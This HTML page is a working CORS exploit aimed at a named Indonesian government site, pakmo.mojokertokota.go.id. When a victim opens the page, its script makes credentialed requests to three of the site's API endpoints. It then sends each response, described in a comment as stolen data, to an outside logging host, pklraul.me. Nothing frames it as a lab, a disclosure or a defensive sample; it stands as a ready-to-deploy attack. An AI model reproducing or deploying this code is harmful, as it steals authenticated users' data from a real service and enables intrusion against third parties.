<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CORS Exploit</title>
</head>
<body>
    <h1>Exploiting CORS on pakmo.mojokertokota.go.id</h1>
    <script>
        // Function to send the exploit request
        function exploitCORS(apiURL) {
            var xhr = new XMLHttpRequest();
            xhr.open("GET", apiURL, true); // Send GET request to API
            xhr.withCredentials = true; // Send cookies/credentials with the request
            xhr.onreadystatechange = function() {
                if (xhr.readyState == 4 && xhr.status == 200) {
                    console.log("Response from " + apiURL + ": " + xhr.responseText);
                    // Send stolen data to attacker's server
                    var img = new Image();
                    img.src = "https://pklraul.me/log.php?data=" + encodeURIComponent(xhr.responseText);
                }
            };
            xhr.send();
        }

        // List of vulnerable URLs to exploit
        const urls = [
            "https://pakmo.mojokertokota.go.id/api/home/statistic",
            "https://pakmo.mojokertokota.go.id/api/home/services?page=1&page_size=10",
            "https://pakmo.mojokertokota.go.id/api/notifications?page=1&page_size=10"
        ];

        // Execute the exploit for each URL
        urls.forEach(url => exploitCORS(url));
    </script>
</body>
</html>
